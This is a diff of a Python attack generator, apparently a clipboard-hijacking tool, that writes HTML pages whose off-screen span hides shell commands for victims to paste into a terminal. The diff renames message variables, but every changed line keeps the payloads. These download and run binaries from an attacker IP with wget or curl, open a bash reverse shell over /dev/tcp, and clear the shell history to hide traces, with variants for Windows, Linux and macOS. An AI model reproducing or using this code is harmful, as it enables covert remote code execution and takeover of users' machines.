@@ -65,7 +65,7 @@ def Windows():
 		Msg=raw_input("   Mensaje 2: ")
 		index="index.html"
 		job=open(index,"w")	
-		job.write("""<p> """+ mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+out+""" & c:\ & cls <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p> """)
+		job.write("""<p> """+ Msg + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+out+""" & c:\ & cls <br> """ + Msg + """ </span> """ + Msg + """ </p> """)
 		job.close()
 
 		print '\033[1;31m'+"""\n-------------------------------------------------------------------
@@ -147,7 +147,7 @@ def Linux():
 		Msg=raw_input("   Сообщение 2: ")
 		NombreIndex="index.html"
 		job=open(NombreIndex,"w")	
-		job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; wget http://"""+ip+"""/payload.elf &> /dev/null && chmod +x ./payload.elf && ./payload.elf & disown && clear <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
+		job.write("""<p> """ + Msg + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; wget http://"""+ip+"""/payload.elf &> /dev/null && chmod +x ./payload.elf && ./payload.elf & disown && clear <br> """ + Msg + """ </span> """ + Msg + """ </p>""")
 		job.close()
 
 		print '\033[1;31m'+"""\n-------------------------------------------------------------------
@@ -250,7 +250,7 @@ def NetcatMacOSX():
 			NombreIndex="index.html"
 			job=open(NombreIndex,"w")	
 ##/bin/bash 0"""+"""<"""+"""/dev/tcp/"""+ip+"""/"""+port+""" 1>&0 2>&0 & clear; clear
-			job.write("""<p> """ + mensaje1 + """\n <span style="position: absolute; left: -2000; top: -100px;" >;/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1 & clear; clear; history -c <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
+			job.write("""<p> """ + Msg + """\n <span style="position: absolute; left: -2000; top: -100px;" >;/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1 & clear; clear; history -c <br> """ + Msg + """ </span> """ + Msg + """ </p>""")
 			job.close()
 
 			print '\033[1;31m'+"""\n-------------------------------------------------------------------
@@ -308,7 +308,7 @@ def ShellMacOSX():
 			Msg=raw_input("   Сообщение 2: ")
 			NombreIndex="index.html"
 			job=open(NombreIndex,"w")	
-			job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >;curl -O http://"""+ip+"""/osx."""+extension+""";chmod +x osx."""+extension+""";"""+ejecucion+"""osx."""+extension+""" & history -c;clear <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
+			job.write("""<p> """ + Msg + """ <span style="position: absolute; left: -2000; top: -100px;" >;curl -O http://"""+ip+"""/osx."""+extension+""";chmod +x osx."""+extension+""";"""+ejecucion+"""osx."""+extension+""" & history -c;clear <br> """ + Msg + """ </span> """ + Msg + """ </p>""")
 			job.close()
 
 			print '\033[1;31m'+"""\n-------------------------------------------------------------------
